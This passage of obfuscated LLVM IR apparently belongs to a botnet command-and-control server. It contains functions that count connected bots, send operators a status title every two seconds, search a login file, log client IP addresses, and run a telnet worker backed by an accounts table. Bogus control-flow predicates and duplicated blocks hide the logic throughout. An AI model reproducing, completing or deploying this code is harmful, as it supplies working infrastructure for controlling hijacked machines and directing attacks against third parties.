  %33 = load i32, i32* %5, align 4
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %35, label %52

; <label>:35:                                     ; preds = %27
  %36 = load i32, i32* @x.7
  %37 = load i32, i32* @y.8
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %35
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.219, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  %44 = load i32, i32* @x.7
  %45 = load i32, i32* @y.8
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %53

; <label>:52:                                     ; preds = %27
  store i32 0, i32* %2, align 4
  br label %53

; <label>:53:                                     ; preds = %52, %originalBBpart24, %originalBBpart2
  %54 = load i32, i32* %2, align 4
  ret i32 %54

originalBBalteredBB:                              ; preds = %originalBB, %10
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.219, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %35
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.219, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #2

declare i32 @printf(i8*, ...) #1

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @clientsConnected() #0 {
  %1 = load i32, i32* @x.9
  %2 = load i32, i32* @y.10
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 0, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %9, align 4
  %11 = load i32, i32* @x.9
  %12 = load i32, i32* @y.10
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %19

; <label>:19:                                     ; preds = %49, %originalBBpart2
  %20 = load i32, i32* @x.9
  %21 = load i32, i32* @y.10
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %19
  %28 = load i32, i32* %9, align 4
  %29 = icmp slt i32 %28, 1000000
  %30 = load i32, i32* @x.9
  %31 = load i32, i32* @y.10
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %29, label %38, label %52

; <label>:38:                                     ; preds = %originalBBpart24
  %39 = load i32, i32* %9, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %40
  %42 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %41, i32 0, i32 2
  %43 = load i8, i8* %42, align 1
  %44 = icmp ne i8 %43, 0
  br i1 %44, label %46, label %45

; <label>:45:                                     ; preds = %38
  br label %49

; <label>:46:                                     ; preds = %38
  %47 = load i32, i32* %10, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %10, align 4
  br label %49

; <label>:49:                                     ; preds = %46, %45
  %50 = load i32, i32* %9, align 4
  %51 = add nsw i32 %50, 1
  store i32 %51, i32* %9, align 4
  br label %19

; <label>:52:                                     ; preds = %originalBBpart24
  %53 = load i32, i32* @x.9
  %54 = load i32, i32* @y.10
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %52
  %61 = load i32, i32* %10, align 4
  %62 = load i32, i32* @x.9
  %63 = load i32, i32* @y.10
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %61

originalBBalteredBB:                              ; preds = %originalBB, %0
  %70 = alloca i32, align 4
  %71 = alloca i32, align 4
  store i32 0, i32* %70, align 4
  store i32 0, i32* %71, align 4
  store i32 0, i32* %70, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %19
  %72 = load i32, i32* %9, align 4
  %73 = icmp slt i32 %72, 1000000
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %52
  %74 = load i32, i32* %10, align 4
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define i8* @titleWriter(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  store i8* %0, i8** %3, align 8
  %6 = load i8*, i8** %3, align 8
  %7 = ptrtoint i8* %6 to i32
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %originalBBpart24, %1
  %9 = load i32, i32* @x.11
  %10 = load i32, i32* @y.12
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 2048, i32 16, i1 false)
  %18 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %19 = call i32 @clientsConnected()
  %20 = load volatile i32, i32* @managesConnected, align 4
  %21 = call i32 (i8*, i8*, ...) @sprintf(i8* %18, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.8, i32 0, i32 0), i32 27, i32 %19, i32 %20, i32 7) #7
  %22 = load i32, i32* %4, align 4
  %23 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %24 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %25 = call i64 @strlen(i8* %24) #8
  %26 = call i64 @send(i32 %22, i8* %23, i64 %25, i32 16384)
  %27 = icmp eq i64 %26, -1
  %28 = load i32, i32* @x.11
  %29 = load i32, i32* @y.12
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %27, label %36, label %37

; <label>:36:                                     ; preds = %originalBBpart2
  br label %37

; <label>:37:                                     ; preds = %36, %originalBBpart2
  %38 = load i32, i32* @x.11
  %39 = load i32, i32* @y.12
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %37
  %46 = call i32 @sleep(i32 2)
  %47 = load i32, i32* @x.11
  %48 = load i32, i32* @y.12
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %8
                                                  ; No predecessors!
  %56 = load i8*, i8** %2, align 8
  ret i8* %56

originalBBalteredBB:                              ; preds = %originalBB, %8
  %57 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %57, i8 0, i64 2048, i32 16, i1 false)
  %58 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %59 = call i32 @clientsConnected()
  %60 = load volatile i32, i32* @managesConnected, align 4
  %61 = call i32 (i8*, i8*, ...) @sprintf(i8* %58, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.8, i32 0, i32 0), i32 27, i32 %59, i32 %60, i32 7) #7
  %62 = load i32, i32* %4, align 4
  %63 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %64 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %65 = call i64 @strlen(i8* %64) #8
  %66 = call i64 @send(i32 %62, i8* %63, i64 %65, i32 16384)
  %67 = icmp eq i64 %66, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %37
  %68 = call i32 @sleep(i32 2)
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @Search_in_File(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i32 0, i32 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

; <label>:11:                                     ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %90

; <label>:12:                                     ; preds = %1
  br label %13

; <label>:13:                                     ; preds = %originalBBpart28, %12
  %14 = load i32, i32* @x.13
  %15 = load i32, i32* @y.14
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  %22 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %23 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %24 = call i8* @fgets(i8* %22, i32 512, %struct._IO_FILE* %23)
  %25 = icmp ne i8* %24, null
  %26 = load i32, i32* @x.13
  %27 = load i32, i32* @y.14
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %25, label %34, label %78

; <label>:34:                                     ; preds = %originalBBpart2
  %35 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %36 = load i8*, i8** %3, align 8
  %37 = call i8* @strstr(i8* %35, i8* %36) #8
  %38 = icmp ne i8* %37, null
  br i1 %38, label %39, label %59

; <label>:39:                                     ; preds = %34
  %40 = load i32, i32* @x.13
  %41 = load i32, i32* @y.14
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %39
  %48 = load i32, i32* %6, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %6, align 4
  %50 = load i32, i32* %5, align 4
  store i32 %50, i32* %7, align 4
  %51 = load i32, i32* @x.13
  %52 = load i32, i32* @y.14
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %59

; <label>:59:                                     ; preds = %originalBBpart24, %34
  %60 = load i32, i32* @x.13
  %61 = load i32, i32* @y.14
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %59
  %68 = load i32, i32* %5, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %5, align 4
  %70 = load i32, i32* @x.13
  %71 = load i32, i32* @y.14
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %13

; <label>:78:                                     ; preds = %originalBBpart2
  %79 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %80 = icmp ne %struct._IO_FILE* %79, null
  br i1 %80, label %81, label %84

; <label>:81:                                     ; preds = %78
  %82 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %83 = call i32 @fclose(%struct._IO_FILE* %82)
  br label %84

; <label>:84:                                     ; preds = %81, %78
  %85 = load i32, i32* %6, align 4
  %86 = icmp eq i32 %85, 0
  br i1 %86, label %87, label %88

; <label>:87:                                     ; preds = %84
  store i32 0, i32* %2, align 4
  br label %90

; <label>:88:                                     ; preds = %84
  %89 = load i32, i32* %7, align 4
  store i32 %89, i32* %2, align 4
  br label %90

; <label>:90:                                     ; preds = %88, %87, %11
  %91 = load i32, i32* %2, align 4
  ret i32 %91

originalBBalteredBB:                              ; preds = %originalBB, %13
  %92 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %93 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %94 = call i8* @fgets(i8* %92, i32 512, %struct._IO_FILE* %93)
  %95 = icmp ne i8* %94, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %39
  %96 = load i32, i32* %6, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %6, align 4
  %98 = load i32, i32* %5, align 4
  store i32 %98, i32* %7, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %59
  %99 = load i32, i32* %5, align 4
  %_ = sub i32 0, %99
  %gen = add i32 %_, 1
  %100 = add nsw i32 %99, 1
  store i32 %100, i32* %5, align 4
  br label %originalBB6
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind uwtable
define void @client_addr(i64, i64) #0 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to { i64, i64 }*
  %6 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %5, i32 0, i32 0
  store i64 %0, i64* %6, align 4
  %7 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %5, i32 0, i32 1
  store i64 %1, i64* %7, align 4
  %8 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %9 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 4
  %11 = and i32 %10, 255
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %13 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %12, i32 0, i32 0
  %14 = load i32, i32* %13, align 4
  %15 = and i32 %14, 65280
  %16 = lshr i32 %15, 8
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  %19 = load i32, i32* %18, align 4
  %20 = and i32 %19, 16711680
  %21 = lshr i32 %20, 16
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %23 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %22, i32 0, i32 0
  %24 = load i32, i32* %23, align 4
  %25 = and i32 %24, -16777216
  %26 = lshr i32 %25, 24
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.11, i32 0, i32 0), i32 %11, i32 %16, i32 %21, i32 %26)
  %28 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %28, %struct._IO_FILE** %4, align 8
  %29 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %31 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %30, i32 0, i32 0
  %32 = load i32, i32* %31, align 4
  %33 = and i32 %32, 255
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %35 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %34, i32 0, i32 0
  %36 = load i32, i32* %35, align 4
  %37 = and i32 %36, 65280
  %38 = lshr i32 %37, 8
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %40 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %39, i32 0, i32 0
  %41 = load i32, i32* %40, align 4
  %42 = and i32 %41, 16711680
  %43 = lshr i32 %42, 16
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %45 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 4
  %47 = and i32 %46, -16777216
  %48 = lshr i32 %47, 24
  %49 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %29, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.14, i32 0, i32 0), i32 %33, i32 %38, i32 %43, i32 %48)
  %50 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %51 = call i32 @fclose(%struct._IO_FILE* %50)
  ret void
}

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: noinline nounwind uwtable
define i8* @telnetWorker(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca [2048 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca [80 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [2048 x i8], align 16
  %14 = alloca %struct._IO_FILE*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [5000 x i8], align 16
  %19 = alloca [5000 x i8], align 16
  %20 = alloca [5000 x i8], align 16
  %21 = alloca [90000 x i8], align 16
  %22 = alloca [90000 x i8], align 16
  %23 = alloca [90000 x i8], align 16
  %24 = alloca [5000 x i8], align 16
  %25 = alloca [5000 x i8], align 16
  %26 = alloca [5000 x i8], align 16
  %27 = alloca [5000 x i8], align 16
  %28 = alloca [5000 x i8], align 16
  %29 = alloca [5000 x i8], align 16
  %30 = alloca [5000 x i8], align 16
  %31 = alloca [5000 x i8], align 16
  %32 = alloca [5000 x i8], align 16
  %33 = alloca [5000 x i8], align 16
  %34 = alloca [5000 x i8], align 16
  %35 = alloca [5000 x i8], align 16
  %36 = alloca [5000 x i8], align 16
  %37 = alloca [5000 x i8], align 16
  %38 = alloca [5000 x i8], align 16
  %39 = alloca [5000 x i8], align 16
  %40 = alloca [5000 x i8], align 16
  %41 = alloca [5000 x i8], align 16
  %42 = alloca [5000 x i8], align 16
  %43 = alloca [5000 x i8], align 16
  %44 = alloca [5000 x i8], align 16
  %45 = alloca [5000 x i8], align 16
  %46 = alloca [5000 x i8], align 16
  %47 = alloca [5000 x i8], align 16
  %48 = alloca [5000 x i8], align 16
  %49 = alloca [5000 x i8], align 16
  %50 = alloca [5000 x i8], align 16
  %51 = alloca [5000 x i8], align 16
  %52 = alloca [5000 x i8], align 16
  %53 = alloca [5000 x i8], align 16
  %54 = alloca [5000 x i8], align 16
  %55 = alloca [5000 x i8], align 16
  %56 = alloca [5000 x i8], align 16
  %57 = alloca [5000 x i8], align 16
  %58 = alloca [5000 x i8], align 16
  %59 = alloca [5000 x i8], align 16
  %60 = alloca [5000 x i8], align 16
  %61 = alloca [5000 x i8], align 16
  %62 = alloca [5000 x i8], align 16
  %63 = alloca [5000 x i8], align 16
  %64 = alloca [5000 x i8], align 16
  %65 = alloca [5000 x i8], align 16
  %66 = alloca [5000 x i8], align 16
  %67 = alloca [5000 x i8], align 16
  %68 = alloca [5000 x i8], align 16
  %69 = alloca [5000 x i8], align 16
  %70 = alloca [5000 x i8], align 16
  %71 = alloca [5000 x i8], align 16
  %72 = alloca [5000 x i8], align 16
  %73 = alloca [5000 x i8], align 16
  %74 = alloca [5000 x i8], align 16
  %75 = alloca [5000 x i8], align 16
  %76 = alloca [5000 x i8], align 16
  %77 = alloca [5000 x i8], align 16
  %78 = alloca [5000 x i8], align 16
  %79 = alloca [5000 x i8], align 16
  %80 = alloca [5000 x i8], align 16
  %81 = alloca [5000 x i8], align 16
  %82 = alloca [5000 x i8], align 16
  %83 = alloca [5000 x i8], align 16
  %84 = alloca [5000 x i8], align 16
  %85 = alloca [5000 x i8], align 16
  %86 = alloca [5000 x i8], align 16
  %87 = alloca [5000 x i8], align 16
  %88 = alloca [5000 x i8], align 16
  %89 = alloca [5000 x i8], align 16
  %90 = alloca [5000 x i8], align 16
  %91 = alloca [5000 x i8], align 16
  %92 = alloca [5000 x i8], align 16
  %93 = alloca [5000 x i8], align 16
  %94 = alloca [5000 x i8], align 16
  %95 = alloca [5000 x i8], align 16
  %96 = alloca [5000 x i8], align 16
  %97 = alloca [5000 x i8], align 16
  %98 = alloca %struct._IO_FILE*, align 8
  %99 = alloca %struct._IO_FILE*, align 8
  %100 = alloca %struct._IO_FILE*, align 8
  %101 = alloca [100 x i8*], align 16
  %102 = alloca i8*, align 8
  %103 = alloca i8*, align 8
  %104 = alloca i8*, align 8
  %105 = alloca i8*, align 8
  %106 = alloca [50 x i8*], align 16
  %107 = alloca [100 x i8*], align 16
  %108 = alloca [100 x i8*], align 16
  %109 = alloca [100 x i8*], align 16
  %110 = alloca [50 x i8*], align 16
  %111 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %3, align 8
  %112 = load i8*, i8** %3, align 8
  %113 = ptrtoint i8* %112 to i32
  store i32 %113, i32* %4, align 4
  %114 = load volatile i32, i32* @managesConnected, align 4
  %115 = add nsw i32 %114, 1
  store volatile i32 %115, i32* @managesConnected, align 4
  %116 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %116, i8 0, i64 2048, i32 16, i1 false)
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.15, i32 0, i32 0), i8** %12, align 8
  %117 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %117, i8 0, i64 2048, i32 16, i1 false)
  %118 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %118, i8 0, i64 2048, i32 16, i1 false)
  store i32 0, i32* %15, align 4
  %119 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i32 0, i32 0))
  store %struct._IO_FILE* %119, %struct._IO_FILE** %14, align 8
  br label %120

; <label>:120:                                    ; preds = %141, %1
  %121 = load i32, i32* @x.17
  %122 = load i32, i32* @y.18
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %120
  %129 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %130 = call i32 @feof(%struct._IO_FILE* %129) #7
  %131 = icmp ne i32 %130, 0
  %132 = xor i1 %131, true
  %133 = load i32, i32* @x.17
  %134 = load i32, i32* @y.18
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %132, label %141, label %146

; <label>:141:                                    ; preds = %originalBBpart2
  %142 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %143 = call i32 @fgetc(%struct._IO_FILE* %142)
  store i32 %143, i32* %16, align 4
  %144 = load i32, i32* %15, align 4
  %145 = add nsw i32 %144, 1
  store i32 %145, i32* %15, align 4
  br label %120

; <label>:146:                                    ; preds = %originalBBpart2
  store i32 0, i32* %17, align 4
  %147 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  call void @rewind(%struct._IO_FILE* %147)
  br label %148

; <label>:148:                                    ; preds = %169, %146
  %149 = load i32, i32* @x.17
  %150 = load i32, i32* @y.18
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBB2, label %originalBB2alteredBB

originalBB2:                                      ; preds = %originalBB2alteredBB, %148
  %157 = load i32, i32* %17, align 4
  %158 = load i32, i32* %15, align 4
  %159 = sub nsw i32 %158, 1
  %160 = icmp ne i32 %157, %159
  %161 = load i32, i32* @x.17
  %162 = load i32, i32* @y.18
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBBpart28, label %originalBB2alteredBB

originalBBpart28:                                 ; preds = %originalBB2
  br i1 %160, label %169, label %189

; <label>:169:                                    ; preds = %originalBBpart28
  %170 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %171 = load i32, i32* %17, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %172
  %174 = getelementptr inbounds %struct.account, %struct.account* %173, i32 0, i32 0
  %175 = getelementptr inbounds [20 x i8], [20 x i8]* %174, i32 0, i32 0
  %176 = load i32, i32* %17, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %177
  %179 = getelementptr inbounds %struct.account, %struct.account* %178, i32 0, i32 1
  %180 = getelementptr inbounds [20 x i8], [20 x i8]* %179, i32 0, i32 0
  %181 = load i32, i32* %17, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %182
  %184 = getelementptr inbounds %struct.account, %struct.account* %183, i32 0, i32 2
  %185 = getelementptr inbounds [20 x i8], [20 x i8]* %184, i32 0, i32 0
